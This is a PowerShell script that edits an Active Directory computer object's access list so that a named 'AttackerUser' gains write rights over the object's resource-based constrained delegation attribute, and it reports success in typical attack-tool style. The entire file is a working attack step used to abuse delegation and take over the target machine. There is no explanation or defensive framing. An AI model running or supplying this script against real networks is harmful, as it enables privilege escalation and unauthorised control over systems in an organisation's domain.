param(
  [Parameter(Mandatory=$true)]
  [string]$TargetComputer,
  [Parameter(Mandatory=$true)]
  [string]$AttackerUser
)
Import-Module ActiveDirectory
$name = $TargetComputer
if ($name.Contains(".")) { $name = $name.Split(".")[0] }
$target = Get-ADComputer -Identity $name -Properties DistinguishedName -ErrorAction SilentlyContinue
if (-not $target -and -not $name.EndsWith("$")) {
  $target = Get-ADComputer -Identity "$name$" -Properties DistinguishedName -ErrorAction SilentlyContinue
}
if (-not $target) { throw "Cannot find computer object '$TargetComputer'." }
$attacker = Get-ADUser -Identity $AttackerUser -Properties SID
$rbcdGuid = [Guid]"3f207c97-507b-4537-a623-41c4f1c71975"
$sid = [System.Security.Principal.SecurityIdentifier]$attacker.SID
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,"WriteProperty","Allow",$rbcdGuid)
$path = "AD:\$($target.DistinguishedName)"
$acl = Get-Acl -Path $path
$acl.AddAccessRule($rule)
Set-Acl -Path $path -AclObject $acl
Write-Host "[+] Granted WriteProperty on RBCD attribute to $AttackerUser for $($target.Name)" -ForegroundColor Green
